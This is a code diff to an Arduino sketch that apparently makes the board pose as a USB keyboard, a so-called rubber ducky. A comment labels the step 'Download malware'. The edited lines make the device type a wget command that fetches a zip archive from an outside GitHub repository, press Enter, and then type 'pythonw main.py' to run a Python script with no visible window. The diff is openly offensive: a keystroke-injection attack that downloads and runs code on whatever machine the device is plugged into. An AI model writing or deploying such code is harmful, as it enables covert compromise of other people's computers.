@@ -23,7 +23,7 @@ void setup() {
   delay(1000);
   
   // Download malware
-  Keyboard.print("wget https://www.github.com/The-TT-Hacker/usb-rubber-ducky");
+  Keyboard.print("wget https://github.com/The-TT-Hacker/usb-rubber-ducky/archive/master.zip");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
@@ -35,4 +35,6 @@ void setup() {
   Keyboard.print("pythonw main.py");
 }
 
-void loop();
+void loop() {
+
+}
